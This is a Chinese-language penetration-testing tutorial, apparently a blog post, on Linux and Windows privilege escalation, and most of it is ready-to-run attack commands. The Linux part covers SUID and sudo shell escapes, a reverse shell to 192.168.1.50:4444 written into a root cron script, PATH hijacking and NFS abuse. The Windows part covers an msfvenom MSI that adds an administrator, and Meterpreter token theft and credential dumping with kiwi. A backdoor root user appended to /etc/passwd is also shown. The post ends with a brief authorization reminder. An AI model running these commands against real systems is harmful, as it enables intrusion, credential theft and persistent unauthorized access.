---
title: 权限提升技术：从普通用户到 Root
slug: kali权限提升技术-k9i0j
date: 2026-08-30
visibility: public
tags: Kali Linux, 权限提升, Linux提权, Windows提权, 渗透测试, 教程
---

# 权限提升技术：从普通用户到 Root

获得初始访问权限只是渗透测试的开始。在实际测试中，初始 shell 往往是低权限账户，需要通过权限提升（Privilege Escalation）获得 root 或 system 权限，才能完全控制目标系统。本文介绍 Linux 和 Windows 两大平台的提权技术。

## 一、权限提升概述

### 提权类型

| 类型 | 说明 | 示例 |
|------|------|------|
| 垂直提权 | 低权限→高权限 | 普通用户→root |
| 水平提权 | 同级别横向移动 | 用户A→用户B |

### 提权思路

```
信息收集 → 发现配置缺陷 → 利用提权 → 获取高权限
                    ↓
  - 内核漏洞
  - SUID 滥用
  - sudo 配置错误
  - 定时任务
  - 密码复用
  - 可写脚本
```

## 二、Linux 提权

### 1. 信息收集

```bash
# 系统信息
uname -a           # 内核版本
cat /etc/os-release # 发行版
hostname           # 主机名
whoami             # 当前用户
id                 # 用户ID和组

# 网络信息
ip addr
ip route
ss -tlnp

# 用户信息
cat /etc/passwd    # 所有用户
cat /etc/shadow    # 密码哈希（需要root）
cat /etc/group     # 用户组

# 进程信息
ps aux
ps -ef

# 定时任务
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
```

### 2. 自动化枚举工具

```bash
# LinPEAS - 最全面的提权枚举脚本
# 下载并运行
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 或上传到目标执行
./linpeas.sh

# LinEnum - 经典枚举工具
./LinEnum.sh

# linux-exploit-suggester
./linux-exploit-suggester.sh
```

### 3. 内核漏洞提权

```bash
# 查看内核版本
uname -r
# 例如：4.4.0-116-generic

# 搜索对应内核漏洞
searchsploit "linux kernel 4.4" | grep -i privilege

# 常见内核漏洞：
# DirtyCow (CVE-2016-5195) - Linux 2.6.22 ~ 4.8.3
# DirtyPipe (CVE-2022-0847) - Linux 5.8 ~ 5.16.11
# 
# 编译并运行 Exploit
gcc exploit.c -o exploit
./exploit
```

### 4. SUID 提权

SUID（Set User ID）程序以文件所有者权限运行，如果所有者是 root，则程序以 root 权限运行：

```bash
# 查找 SUID 程序
find / -perm -4000 -type f 2>/dev/null

# 常见可利用的 SUID 程序
# 通过 GTFOBins 查询：https://gtfobins.github.io/

# 示例：find 命令 SUID 提权
find . -exec /bin/sh -p \; -quit

# 示例：vim SUID 提权
vim -c ':py3 import os; os.system("chmod +s /bin/bash")'

# 示例：nmap SUID 提权（旧版）
nmap --interactive
nmap> !sh

# 示例：python SUID 提权
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 示例：cp SUID 提权（复制 /etc/passwd 修改后覆盖）
cp /etc/passwd /tmp/passwd
# 修改 /tmp/passwd 添加 root 用户
cp /tmp/passwd /etc/passwd
```

### 5. sudo 配置错误提权

```bash
# 查看 sudo 权限
sudo -l

# 如果输出：
# User test may run the following commands on host:
#   (ALL) NOPASSWD: /usr/bin/vim
# 则可以利用 vim 提权

sudo vim -c ':!bash'

# 常见可利用的 sudo 命令（参考 GTFOBins）
sudo find / -exec bash \;
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo perl -e 'exec "/bin/bash"'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo less /etc/passwd  # 然后输入 !sh
```

### 6. 定时任务提权

```bash
# 查看定时任务
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/

# 如果发现以 root 运行的定时任务脚本，且该脚本可写：
# 例如 /etc/cron.daily/backup.sh 以 root 运行

# 查看脚本权限
ls -la /etc/cron.daily/backup.sh
# 如果 -rwxrwxrwx，则可以修改

# 注入反弹 shell
echo 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1' >> /etc/cron.daily/backup.sh

# 等待 cron 执行，监听端口
nc -lvnp 4444
```

### 7. PATH 劫持

```bash
# 如果某个 SUID 程序调用了其他命令（如 service），且没有用绝对路径
# 可以通过修改 PATH 来劫持

# 查看程序调用了什么
strings /usr/bin/vulnerable_app | grep -E "service|cat|ls"

# 创建同名恶意脚本
echo '/bin/bash' > /tmp/service
chmod +x /tmp/service

# 修改 PATH 优先级
export PATH=/tmp:$PATH

# 运行 SUID 程序
/usr/bin/vulnerable_app
```

### 8. Capabilities 提权

```bash
# 查找有特殊 capabilities 的文件
getcap -r / 2>/dev/null

# 常见可利用的 capabilities：
# cap_setuid - 可以改变用户 ID
# cap_dac_override - 绕过文件权限检查

# 示例：python 有 cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### 9. NFS 提权

```bash
# 查看 NFS 导出
cat /etc/exports

# 如果有 no_root_squash 选项
# /share *(rw,no_root_squash)

# 在攻击机上挂载，以 root 权限写入 SUID 程序
mkdir /tmp/nfs
mount -o vers=3 target:/share /tmp/nfs
cd /tmp/nfs
cp /bin/bash .
chmod +s bash
# 然后在目标上执行 /share/bash -p
```

## 三、Windows 提权

### 1. 信息收集

```cmd
# 系统信息
systeminfo
whoami /all
whoami /priv

# 网络信息
ipconfig /all
netstat -ano

# 用户信息
net user
net localgroup administrators

# 服务信息
sc query
wmic service list brief
```

### 2. 自动化枚举

```bash
# WinPEAS
winpeas.exe
winpeas.bat

# PowerUp
Import-Module PowerUp.ps1
Invoke-AllChecks

# Seatbelt
Seatbelt.exe -group=all
```

### 3. 常见提权方法

```cmd
# 内核漏洞提权
# 查看补丁信息
wmic qfe list brief
# 搜索缺失补丁对应的漏洞
# 例如：MS16-032, MS16-135, CVE-2021-1675

# 服务路径未引用提权
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i "unquoted"
# 如果发现 C:\Program Files\My App\app.exe
# 可以在 C:\Program Files\My.exe 写入恶意程序

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 如果为 1，可以用 msi 包提权
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi -o setup.msi
msiexec /quiet /qn /i setup.msi

# 令牌窃取
# 需要 Meterpreter
load incognito
list_tokens -u
impersonate_token DOMAIN\\Administrator
```

### 4. Metasploit 提权

```bash
# 在 Meterpreter 中
# 自动提权建议
run post/multi/recon/local_exploit_suggester

# 使用建议的模块
use exploit/windows/local/bypassuac
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

# getsystem 自动提权
getsystem
```

## 四、提权后操作

```bash
# Linux
# 确认权限
whoami  # 应该是 root
id

# 抓取密码
cat /etc/shadow
# 使用 unshadow + john 破解

# 添加后门用户
echo "backdoor:$(openssl passwd -1 Password123):0:0::/root:/bin/bash" >> /etc/passwd

# Windows
whoami  # 应该是 nt authority\system
# 抓取密码
load kiwi
creds_all
```

## 五、常见问题

| 问题 | 原因 | 解决 |
|------|------|------|
| Exploit 编译失败 | 缺少依赖 | 安装 gcc/make |
| 提权后 shell 不稳定 | PTY 问题 | python -c 'import pty; pty.spawn("/bin/bash")' |
| sudo 提权需要密码 | 没 NOPASSWD | 尝试其他方法 |
| 内核 Exploit 导致死机 | 版本不匹配 | 先确认内核版本 |

## 安全提醒

> 提权操作可能影响系统稳定性，甚至导致崩溃。在生产环境中测试务必谨慎，做好快照。所有操作需在授权范围内进行。

## 小结

- 信息收集是提权的基础，用 LinPEAS/WinPEAS 自动化枚举
- SUID + GTFOBins 是 Linux 提权的利器
- sudo 配置错误是最常见的提权途径
- 内核漏洞提权是最直接但风险最高的方法
- Windows 提权常用服务配置错误和令牌窃取

> 下一篇我们将学习后渗透操作与痕迹清理，这是渗透测试的最后阶段。
